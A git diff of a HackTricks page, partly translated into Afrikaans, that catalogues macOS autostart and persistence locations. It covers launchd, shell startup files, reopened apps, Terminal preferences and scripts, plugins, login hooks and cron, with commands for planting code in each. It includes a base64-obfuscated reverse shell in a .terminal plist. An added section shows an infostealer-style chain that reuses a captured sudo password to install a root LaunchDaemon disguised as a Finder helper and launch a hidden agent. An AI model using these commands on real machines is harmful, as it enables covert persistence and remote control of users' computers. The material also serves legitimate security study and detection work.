@@ -1,55 +1,55 @@
-# macOS Auto Start
+# macOS Outomatiese Begin
 
 {{#include ../banners/hacktricks-training.md}}
 
-Hierdie afdeling is sterk gebaseer op die blogreeks [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), die doel is om **meer Autostart Plekke** by te voeg (indien moontlik), aan te dui **watter tegnieke steeds werk** vandag met die nuutste weergawe van macOS (13.4) en om die **toestemmings** wat benodig word, te spesifiseer.
+This section is heavily based on the blog series [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), the goal is to add **more Autostart Locations** (if possible), indicate **which techniques are still working** nowadays with latest version of macOS (13.4) and to specify the **permissions** needed.
 
 ## Sandbox Bypass
 
 > [!TIP]
-> Hier kan jy start plekke vind wat nuttig is vir **sandbox bypass** wat jou toelaat om eenvoudig iets uit te voer deur dit **in 'n lêer te skryf** en **te wag** vir 'n baie **gewone** **aksie**, 'n bepaalde **hoeveelheid tyd** of 'n **aksie wat jy gewoonlik kan uitvoer** van binne 'n sandbox sonder om root-toestemmings te benodig.
+> Hier kan jy start-ligginge vind wat nuttig is vir **sandbox bypass** wat jou toelaat om eenvoudig iets uit te voer deur dit in 'n lêer te **skryf** en **te wag** vir 'n baie **algemene** **aksie**, 'n bepaalde **tydperk** of 'n **aksie wat jy gewoonlik van binne 'n sandbox kan uitvoer** sonder om root-permissies te benodig.
 
 ### Launchd
 
 - Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
 - TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Plekke
+#### Locations
 
 - **`/Library/LaunchAgents`**
-- **Trigger**: Herlaai
-- Root benodig
+- **Trigger**: Reboot
+- Root vereis
 - **`/Library/LaunchDaemons`**
-- **Trigger**: Herlaai
-- Root benodig
+- **Trigger**: Reboot
+- Root vereis
 - **`/System/Library/LaunchAgents`**
-- **Trigger**: Herlaai
-- Root benodig
+- **Trigger**: Reboot
+- Root vereis
 - **`/System/Library/LaunchDaemons`**
-- **Trigger**: Herlaai
-- Root benodig
+- **Trigger**: Reboot
+- Root vereis
 - **`~/Library/LaunchAgents`**
-- **Trigger**: Herlaai-in
+- **Trigger**: Heraanmelding
 - **`~/Library/LaunchDemons`**
-- **Trigger**: Herlaai-in
+- **Trigger**: Heraanmelding
 
 > [!TIP]
-> As 'n interessante feit, **`launchd`** het 'n ingebedde eiendomslys in die Mach-o afdeling `__Text.__config` wat ander bekende dienste bevat wat launchd moet begin. Boonop kan hierdie dienste die `RequireSuccess`, `RequireRun` en `RebootOnSuccess` bevat wat beteken dat hulle moet loop en suksesvol voltooi word.
+> As 'n interessante feit het **`launchd`** 'n ingebedde property list in die Mach-o-seksie `__Text.__config` wat ander bekende dienste bevat wat launchd moet begin. Verder kan hierdie dienste die `RequireSuccess`, `RequireRun` en `RebootOnSuccess` bevat, wat beteken dat hulle uitgevoer en suksesvol voltooi moet word.
 >
-> Natuurlik, dit kan nie gewysig word nie weens kode ondertekening.
+> Natuurlik kan dit nie gewysig word weens code signing nie.
 
-#### Beskrywing & Exploitatie
+#### Beskrywing & Exploitation
 
-**`launchd`** is die **eerste** **proses** wat deur die OX S-kern by opstart uitgevoer word en die laaste een om te eindig by afsluiting. Dit moet altyd die **PID 1** hê. Hierdie proses sal **lees en uitvoer** die konfigurasies wat in die **ASEP** **plists** aangedui word in:
+**`launchd`** is die **eerste** **proses** wat deur die OX S kernel by opstart uitgevoer word en die laaste een wat by afsluiting voltooi word. Dit behoort altyd die **PID 1** te hê. Hierdie proses sal die konfigurasies wat in die **ASEP** **plists** aangedui word **lees en uitvoer** in:
 
-- `/Library/LaunchAgents`: Per-gebruiker agente geïnstalleer deur die admin
-- `/Library/LaunchDaemons`: Stelselwye demone geïnstalleer deur die admin
-- `/System/Library/LaunchAgents`: Per-gebruiker agente verskaf deur Apple.
-- `/System/Library/LaunchDaemons`: Stelselwye demone verskaf deur Apple.
+- `/Library/LaunchAgents`: Per-gebruiker agents wat deur die admin geïnstalleer is
+- `/Library/LaunchDaemons`: Stelselwye daemons wat deur die admin geïnstalleer is
+- `/System/Library/LaunchAgents`: Per-gebruiker agents verskaf deur Apple.
+- `/System/Library/LaunchDaemons`: Stelselwye daemons verskaf deur Apple.
 
-Wanneer 'n gebruiker aanmeld, word die plists geleë in `/Users/$USER/Library/LaunchAgents` en `/Users/$USER/Library/LaunchDemons` begin met die **aangemelde gebruikers se toestemmings**.
+Wanneer 'n gebruiker aanmeld, word die plists geleë in `/Users/$USER/Library/LaunchAgents` en `/Users/$USER/Library/LaunchDemons` begin met die **toestemmings van die aangetekende gebruiker**.
 
-Die **hoofdifferensie tussen agente en demone is dat agente gelaai word wanneer die gebruiker aanmeld en die demone gelaai word by stelselaanvang** (aangesien daar dienste soos ssh is wat uitgevoer moet word voordat enige gebruiker toegang tot die stelsel het). Ook kan agente GUI gebruik terwyl demone in die agtergrond moet loop.
+Die **hoofverskil** tussen agents en daemons is dat agents gelaai word wanneer die gebruiker aanmeld en die daemons by stelselopstart gelaai word (aangesien daar dienste soos ssh is wat uitgevoer moet word voordat enige gebruiker toegang tot die stelsel kry). Verder kan agents GUI gebruik, terwyl daemons in die agtergrond moet loop.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
@@ -72,77 +72,91 @@ Die **hoofdifferensie tussen agente en demone is dat agente gelaai word wanneer 
 </dict>
 </plist>
 ```
-Daar is gevalle waar 'n **agent uitgevoer moet word voordat die gebruiker aanmeld**, hierdie word **PreLoginAgents** genoem. Byvoorbeeld, dit is nuttig om assistiewe tegnologie by aanmelding te bied. Hulle kan ook gevind word in `/Library/LaunchAgents` (sien [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) 'n voorbeeld).
+Daar is gevalle waar 'n **agent uitgevoer moet word voordat die gebruiker aanmeld**, hierdie word **PreLoginAgents** genoem. Byvoorbeeld, dit is nuttig om assistiewe tegnologie tydens aanmelding te voorsien. Hulle kan ook in `/Library/LaunchAgents` gevind word (sien [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) vir 'n voorbeeld).
 
-> [!NOTE]
-> Nuwe Daemons of Agents konfigurasie lêers sal **gelaai word na die volgende herlaai of deur** `launchctl load <target.plist>` Dit is **ook moontlik om .plist lêers sonder daardie uitbreiding** te laai met `launchctl -F <file>` (maar daardie plist lêers sal nie outomaties gelaai word na herlaai).\
-> Dit is ook moontlik om te **ontlaai** met `launchctl unload <target.plist>` (die proses waarna verwys word sal beëindig word),
+> [!TIP]
+> New Daemons or Agents config files will be **gelaai na die volgende herbegin of deur gebruik te maak van** `launchctl load <target.plist>` Dit is **ook moontlik om .plist files without that extension** met `launchctl -F <file>` (egter daardie plist files sal nie outomaties na herbegin gelaai word nie).\
+> Dit is ook moontlik om te **unload** met `launchctl unload <target.plist>` (die proses waarna dit verwys sal beëindig word),
 >
-> Om te **verseker** dat daar nie **iets** (soos 'n oorskryding) is wat 'n **Agent** of **Daemon** **verhinder** om **te loop** nie, voer in: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
+> Om **verseker** dat daar nie **iets** (soos 'n override) is wat **voorkom** dat 'n **Agent** of **Daemon** **van** **hardloop** nie, voer uit: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
 
-Lys al die agente en daemons wat deur die huidige gebruiker gelaai is:
+Lys al die agents and daemons gelaai deur die huidige gebruiker:
 ```bash
 launchctl list
 ```
+#### Voorbeeld kwaadwillige LaunchDaemon-ketting (hergebruik van wagwoord)
+
+Onlangs het 'n macOS infostealer 'n **opgetekende sudo-wagwoord** hergebruik om 'n user agent en 'n root LaunchDaemon neer te sit:
+
+- Skryf die agent-lus na `~/.agent` en maak dit uitvoerbaar.
+- Genereer 'n plist in `/tmp/starter` wat na daardie agent wys.
+- Hergebruik die opgetekende wagwoord met `sudo -S` om dit na `/Library/LaunchDaemons/com.finder.helper.plist` te kopieer, `root:wheel` te stel, en dit te laai met `launchctl load`.
+- Begin die agent stilweg via `nohup ~/.agent >/dev/null 2>&1 &` om die uitvoer te loskoppel.
+```bash
+printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
+printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
+printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
+nohup "$HOME/.agent" >/dev/null 2>&1 &
+```
 > [!WARNING]
-> As 'n plist aan 'n gebruiker behoort, selfs al is dit in 'n daemon stelselswye vouers, sal die **taak as die gebruiker uitgevoer word** en nie as root nie. Dit kan sommige voorregverhoging aanvalle voorkom.
+> As 'n plist deur 'n user besit word, selfs al is dit in stelselwye daemon-lêergidse, sal die **taak as die user uitgevoer word** en nie as root nie. Dit kan sekere privilege escalation-aanvalle voorkom.
 
-#### Meer inligting oor launchd
+#### More info about launchd
 
-**`launchd`** is die **eerste** gebruikersmodus proses wat van die **kernel** begin. Die proses moet **suksesvol** begin en dit **kan nie verlaat of crash nie**. Dit is selfs **beskerm** teen sommige **doodmaak seine**.
+**`launchd`** is die **eerste** user-mode proses wat vanaf die **kernel** begin word. Die prosesbegin moet **suksesvol** wees en dit **kan nie afsluit of crash** nie. Dit is selfs **beskerm** teen sekere **doodmaak seine**.
 
-Een van die eerste dinge wat `launchd` sou doen, is om **alle** **daemons** soos:
+Een van die eerste dinge wat `launchd` sal doen, is om al die **daemons** te **begin**, soos:
 
 - **Timer daemons** gebaseer op tyd om uitgevoer te word:
 - atd (`com.apple.atrun.plist`): Het 'n `StartInterval` van 30min
-- crond (`com.apple.systemstats.daily.plist`): Het `StartCalendarInterval` om om 00:15 te begin
-- **Netwerk daemons** soos:
-- `org.cups.cups-lpd`: Luister in TCP (`SockType: stream`) met `SockServiceName: printer`
-- SockServiceName moet óf 'n poort óf 'n diens van `/etc/services` wees
-- `com.apple.xscertd.plist`: Luister op TCP in poort 1640
-- **Pad daemons** wat uitgevoer word wanneer 'n spesifieke pad verander:
+- crond (`com.apple.systemstats.daily.plist`): Het `StartCalendarInterval` om te begin om 00:15
+- **Network daemons** soos:
+- `org.cups.cups-lpd`: Luister op TCP (`SockType: stream`) met `SockServiceName: printer`
+- SockServiceName moet óf 'n poort wees óf 'n diens uit `/etc/services`
+- `com.apple.xscertd.plist`: Luister op TCP op poort 1640
+- **Path daemons** wat uitgevoer word wanneer 'n gespesifiseerde pad verander:
 - `com.apple.postfix.master`: Kontroleer die pad `/etc/postfix/aliases`
-- **IOKit kennisgewing daemons**:
+- **IOKit notifications daemons**:
 - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
 - **Mach port:**
-- `com.apple.xscertd-helper.plist`: Dit dui in die `MachServices` inskrywing die naam `com.apple.xscertd.helper` aan
+- `com.apple.xscertd-helper.plist`: Dui in die `MachServices` invoer die naam `com.apple.xscertd.helper` aan
 - **UserEventAgent:**
-- Dit is anders as die vorige een. Dit laat launchd toe om toepassings te laat ontstaan in reaksie op spesifieke gebeurtenisse. In hierdie geval is die hoof binêre betrokke nie `launchd` nie, maar `/usr/libexec/UserEventAgent`. Dit laai plugins van die SIP-beperkte vouer /System/Library/UserEventPlugins/ waar elke plugin sy inisialisator in die `XPCEventModuleInitializer` sleutel aandui of, in die geval van ouer plugins, in die `CFPluginFactories` dict onder die sleutel `FB86416D-6164-2070-726F-70735C216EC0` van sy `Info.plist`.
+- Dit verskil van die vorige een. Dit laat launchd toe om apps te spawn in reaksie op spesifieke gebeurtenisse. In hierdie geval is die hoof-binary betrokke egter nie `launchd` nie maar `/usr/libexec/UserEventAgent`. Dit laai plugins vanaf die SIP-beperkte gids /System/Library/UserEventPlugins/ waar elke plugin sy initialiser aandui in die `XPCEventModuleInitializer` sleutel of, in die geval van ouer plugins, in die `CFPluginFactories` dict onder die sleutel `FB86416D-6164-2070-726F-70735C216EC0` van sy `Info.plist`.
 
-### shell opstartlêers
+### shell startup files
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
 Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)
 
-- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
-- TCC Omseiling: [✅](https://emojipedia.org/check-mark-button)
-- Maar jy moet 'n toepassing vind met 'n TCC omseiling wat 'n shell uitvoer wat hierdie lêers laai
+- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
+- But you need to find an app with a TCC bypass that executes a shell that loads these files
 
-#### Plekke
+#### Locations
 
 - **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
-- **Trigger**: Maak 'n terminal met zsh oop
+- **Aktiveer**: Open 'n terminal met zsh
 - **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
-- **Trigger**: Maak 'n terminal met zsh oop
-- Root benodig
+- **Aktiveer**: Open 'n terminal met zsh
+- Root vereis
 - **`~/.zlogout`**
-- **Trigger**: Verlaat 'n terminal met zsh
+- **Aktiveer**: Sluit 'n terminal met zsh
 - **`/etc/zlogout`**
-- **Trigger**: Verlaat 'n terminal met zsh
-- Root benodig
+- **Aktiveer**: Sluit 'n terminal met zsh
+- Root vereis
 - Potensieel meer in: **`man zsh`**
 - **`~/.bashrc`**
-- **Trigger**: Maak 'n terminal met bash oop
+- **Aktiveer**: Open 'n terminal met bash
 - `/etc/profile` (het nie gewerk nie)
 - `~/.profile` (het nie gewerk nie)
 - `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
-- **Trigger**: Verwag om met xterm te aktiveer, maar dit **is nie geïnstalleer nie** en selfs na installasie word hierdie fout gewerp: xterm: `DISPLAY is not set`
+- **Aktiveer**: Veronderstel om met xterm te aktiveer, maar dit **is nie geïnstalleer** nie en selfs nadat dit geïnstalleer is word hierdie fout gegee: xterm: `DISPLAY is not set`
 
-#### Beskrywing & Exploitatie
+#### Description & Exploitation
 
-Wanneer 'n shell omgewing soos `zsh` of `bash` geinitieer word, **word sekere opstartlêers uitgevoer**. macOS gebruik tans `/bin/zsh` as die standaard shell. Hierdie shell word outomaties toeganklik wanneer die Terminal-toepassing gelaai word of wanneer 'n toestel via SSH benader word. Terwyl `bash` en `sh` ook in macOS teenwoordig is, moet hulle eksplisiet aangeroep word om gebruik te word.
+Wanneer 'n shell-omgewing soos `zsh` of `bash` geïnisieer word, word **sekere startup-lêers uitgevoer**. macOS gebruik tans `/bin/zsh` as die standaard shell. Hierdie shell word outomaties aangeroep wanneer die Terminal-app geopen word of wanneer 'n toestel via SSH bereik word. Terwyl `bash` en `sh` ook in macOS teenwoordig is, moet hulle uitdruklik aangeroep word om gebruik te word.
 
-Die manbladsy van zsh, wat ons kan lees met **`man zsh`**, het 'n lang beskrywing van die opstartlêers.
+Die man-bladsy van zsh, wat ons kan lees met **`man zsh`**, het 'n lang beskrywing van die startup-lêers.
 ```bash
 # Example executino via ~/.zshrc
 echo "touch /tmp/hacktricks" >> ~/.zshrc
@@ -150,23 +164,23 @@ echo "touch /tmp/hacktricks" >> ~/.zshrc
 ### Heropende Toepassings
 
 > [!CAUTION]
-> Die konfigurasie van die aangeduide uitbuiting en afteken en aanteken of selfs herbegin het nie vir my gewerk om die app uit te voer nie. (Die app is nie uitgevoer nie, miskien moet dit loop wanneer hierdie aksies uitgevoer word)
+> Om die aangeduide uitbuiting te konfigureer en uit te teken en weer aan te meld, of selfs te herbegin, het nie vir my gewerk om die app uit te voer nie. (Die app is nie uitgevoer nie; moontlik moet dit loop wanneer hierdie aksies uitgevoer word)
 
-**Skrywe**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)
+**Verslag**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)
 
-- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- Nuttig om die sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Ligging
 
 - **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
-- **Trigger**: Herbegin heropen toepassings
+- **Trigger**: Herbegin om toepassings te heropen
 
 #### Beskrywing & Uitbuiting
 
-Al die toepassings om te heropen is binne die plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`
+Al die toepassings wat heropen word is binne die plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`
 
-So, om die heropen toepassings jou eie te laat begin, moet jy net **jou app by die lys voeg**.
+Maak dus dat die heropen-toepassings jou eie app begin; jy hoef net jou app by die lys te **voeg**.
 
 Die UUID kan gevind word deur daardie gids te lys of met `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`
 
@@ -176,7 +190,7 @@ defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
 #or
 plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 ```
-Om **'n toepassing aan hierdie lys toe te voeg** kan jy gebruik maak van:
+Om **'n toepassing by hierdie lys te voeg** kan jy gebruik:
 ```bash
 # Adding iTerm2
 /usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
@@ -188,24 +202,24 @@ Om **'n toepassing aan hierdie lys toe te voeg** kan jy gebruik maak van:
 ```
 ### Terminal Voorkeure
 
-- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
-- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
-- Terminal gebruik om FDA-toestemmings van die gebruiker te hê
+- Nuttig om die sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- Terminal het toegang tot die gebruiker se FDA-permissies wanneer dit gebruik word
 
 #### Ligging
 
 - **`~/Library/Preferences/com.apple.Terminal.plist`**
-- **Trigger**: Open Terminal
+- **Trigger**: Maak Terminal oop
 
-#### Beskrywing & Exploitatie
+#### Beskrywing & Uitbuiting
 
-In **`~/Library/Preferences`** word die voorkeure van die gebruiker in die Toepassings gestoor. Sommige van hierdie voorkeure kan 'n konfigurasie bevat om **ander toepassings/scripte uit te voer**.
+In **`~/Library/Preferences`** word die voorkeurinstellings van die gebruiker vir toepassings gestoor. Sommige van hierdie voorkeure kan 'n konfigurasie bevat om ander toepassings/skripte uit te voer.
 
-Byvoorbeeld, die Terminal kan 'n opdrag in die Opstart uitvoer:
+Byvoorbeeld, die Terminal kan 'n opdrag by opstart uitvoer:
 
 <figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>
 
-Hierdie konfigurasie word in die lêer **`~/Library/Preferences/com.apple.Terminal.plist`** soos volg weerspieël:
+Hierdie konfigurasie word weerspieël in die lêer **`~/Library/Preferences/com.apple.Terminal.plist`** soos volg:
 ```bash
 [...]
 "Window Settings" => {
@@ -221,7 +235,7 @@ Hierdie konfigurasie word in die lêer **`~/Library/Preferences/com.apple.Termin
 }
 [...]
 ```
-So, as die plist van die voorkeure van die terminal in die stelsel oorgeskryf kan word, kan die **`open`** funksionaliteit gebruik word om **die terminal te open en daardie opdrag sal uitgevoer word**.
+Dus, as die plist van die voorkeure van die terminal in die stelsel oorgeskryf kan word, kan die **`open`** funksionaliteit gebruik word om **die terminal oop te maak en daardie opdrag sal uitgevoer word**.
 
 Jy kan dit vanaf die cli byvoeg met:
 ```bash
@@ -232,20 +246,20 @@ Jy kan dit vanaf die cli byvoeg met:
 # Remove
 /usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
 ```
-### Terminal Skripte / Ander lêer uitbreidings
+### Terminal-skripte / Ander lêeruitbreidings
 
-- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
-- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
-- Terminal gebruik om FDA toestemmings van die gebruiker te hê
+- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- Terminal kan gebruik word om die FDA-permissies van die gebruiker te benut wanneer die gebruiker dit gebruik
 
 #### Ligging
 
 - **Enige plek**
 - **Trigger**: Open Terminal
 
-#### Beskrywing & Exploitatie
+#### Beskrywing & Uitbuiting
 
-As jy 'n [**`.terminal`** skrip](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) skep en dit oopmaak, sal die **Terminal-toepassing** outomaties geaktiveer word om die opdragte wat daar aangedui is, uit te voer. As die Terminal-app spesiale voorregte het (soos TCC), sal jou opdrag met daardie spesiale voorregte uitgevoer word.
+As jy 'n [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) skep en dit oopmaak, sal die **Terminal-toepassing** outomaties aangeroep word om die daarin aangeduide opdragte uit te voer. As die Terminal-app sekere spesiale voorregte het (soos TCC), sal jou opdrag met daardie spesiale voorregte uitgevoer word.
 
 Probeer dit met:
 ```bash
@@ -275,21 +289,21 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
-U kan ook die uitbreidings **`.command`**, **`.tool`**, met gewone shell skripte-inhoud gebruik en hulle sal ook deur Terminal geopen word.
+You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.
 
 > [!CAUTION]
-> As terminal **Volledige Skyf Toegang** het, sal dit in staat wees om daardie aksie te voltooi (let daarop dat die uitgevoerde opdrag sigbaar sal wees in 'n terminalvenster).
+> If Terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a Terminal window).
 
-### Klank Plugins
+### Audio Plugins
 
-Skrywe: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
-Skrywe: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
+Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
 
 - Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
-- TCC omseiling: [🟠](https://emojipedia.org/large-orange-circle)
-- U mag ekstra TCC toegang kry
+- TCC-bypass: [🟠](https://emojipedia.org/large-orange-circle)
+- Jy kan dalk ekstra TCC-toegang kry
 
-#### Ligging
+#### Location
 
 - **`/Library/Audio/Plug-Ins/HAL`**
 - Root benodig
@@ -303,19 +317,19 @@ Skrywe: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://p
 - Root benodig
 - **Trigger**: Herbegin coreaudiod of die rekenaar
 
-#### Beskrywing
+#### Description
 
-Volgens die vorige skrywes is dit moontlik om **sommige klank plugins te compileer** en hulle te laai.
+Volgens die vorige writeups is dit moontlik om sekere audio plugins te compile en hulle gelaai te kry.
 
 ### QuickLook Plugins
 
-Skrywe: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)
 
 - Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
-- TCC omseiling: [🟠](https://emojipedia.org/large-orange-circle)
-- U mag ekstra TCC toegang kry
+- TCC-bypass: [🟠](https://emojipedia.org/large-orange-circle)
+- Jy kan dalk ekstra TCC-toegang kry
 
-#### Ligging
+#### Location
 
 - `/System/Library/QuickLook`
 - `/Library/QuickLook`
@@ -323,28 +337,28 @@ Skrywe: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.gi
 - `/Applications/AppNameHere/Contents/Library/QuickLook/`
 - `~/Applications/AppNameHere/Contents/Library/QuickLook/`
 
-#### Beskrywing & Exploitatie
+#### Description & Exploitation
 
-QuickLook plugins kan uitgevoer word wanneer u **die voorvertoning van 'n lêer aktiveer** (druk spasie met die lêer in Finder gekies) en 'n **plugin wat daardie lêer tipe ondersteun** is geïnstalleer.
+QuickLook plugins kan uitgevoer word wanneer jy die **voorskou van 'n lêer aktiveer** (druk spasiebalk met die lêer in Finder geselekteer) en 'n **plugin wat daardie lêertipe ondersteun** geïnstalleer is.
 
-Dit is moontlik om u eie QuickLook plugin te compileer, dit in een van die vorige liggings te plaas om dit te laai en dan na 'n ondersteunde lêer te gaan en spasie te druk om dit te aktiveer.
+Dit is moontlik om jou eie QuickLook-plugin te compile, dit in een van die vorige liggings te plaas sodat dit gelaai word, en dan na 'n ondersteunende lêer te gaan en spasie te druk om dit te aktiveer.
 
-### ~~Inlog/Uitlog Hooks~~
+### ~~Login/Logout Hooks~~
 
 > [!CAUTION]
-> Dit het nie vir my gewerk nie, nie met die gebruiker LoginHook nie, of met die root LogoutHook nie
+> This didn't work for me, neither with the user LoginHook nor with the root LogoutHook
 
-**Skrywe**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)
+**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)
 
 - Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Ligging
+#### Location
 
-- U moet in staat wees om iets soos `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` uit te voer
-- `Lo`k in `~/Library/Preferences/com.apple.loginwindow.plist`
+- You need to be able to execute something like `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
+- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`
 
-Hulle is verouderd, maar kan gebruik word om opdragte uit te voer wanneer 'n gebruiker aanmeld.
+Hulle is verouderd maar kan gebruik word om commands uit te voer wanneer 'n gebruiker aanmeld.
 ```bash
 cat > $HOME/hook.sh << EOF
 #!/bin/bash
@@ -371,68 +385,68 @@ Om dit te verwyder:
 defaults delete com.apple.loginwindow LoginHook
 defaults delete com.apple.loginwindow LogoutHook
 ```
-Die wortel gebruiker een word gestoor in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**
+Die root user een word gestoor in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**
 
-## Voorwaardelike Sandbox Bypass
+## Conditional Sandbox Bypass
 
 > [!TIP]
-> Hier kan jy begin plekke vind wat nuttig is vir **sandbox bypass** wat jou toelaat om eenvoudig iets uit te voer deur dit **in 'n lêer te skryf** en **nie super algemene toestande** te verwag nie, soos spesifieke **programme geïnstalleer, "ongewone" gebruiker** aksies of omgewings.
+> Hier kan jy beginlokasies vind wat nuttig is vir **sandbox bypass** wat jou toelaat om eenvoudig iets uit te voer deur dit in 'n lêer te skryf en te reken op nie besonders algemene toestande nie, soos spesifieke **programs installed**, "ongewoon" gebruiker-aksies of omgewings.
 
 ### Cron
 
-**Skrywe**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)
+**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)
 
-- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
-- Jy moet egter in staat wees om die `crontab` binêre uit te voer
+- Nuttig vir sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
+- Jy moet egter in staat wees om die `crontab` binary uit te voer
 - Of wees root
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Plek
+#### Location
 
 - **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
-- Wortel benodig vir direkte skrywe toegang. Geen wortel benodig as jy `crontab <file>` kan uitvoer nie
-- **Trigger**: Hang af van die cron werk
+- Root benodig vir direkte skryftoegang. Geen root benodig as jy `crontab <file>` kan uitvoer
+- **Trigger**: Hang af van die cron job
 
-#### Beskrywing & Exploitatie
+#### Description & Exploitation
 
-Lys die cron werke van die **huidige gebruiker** met:
+Lys die cron jobs van die **huidige gebruiker** met:
 ```bash
 crontab -l
 ```
-U kan ook al die cron take van die gebruikers in **`/usr/lib/cron/tabs/`** en **`/var/at/tabs/`** sien (vereis root).
+Jy kan ook al die cron jobs van gebruikers sien in **`/usr/lib/cron/tabs/`** en **`/var/at/tabs/`** (vereis root-toegang).
 
-In MacOS kan verskeie vouers wat skripte met **sekere frekwensie** uitvoer, gevind word in:
+In MacOS kan verskeie vouers wat skripte met **'n bepaalde frekwensie** uitvoer gevind word in:
 ```bash
 # The one with the cron jobs is /usr/lib/cron/tabs/
 ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
 ```
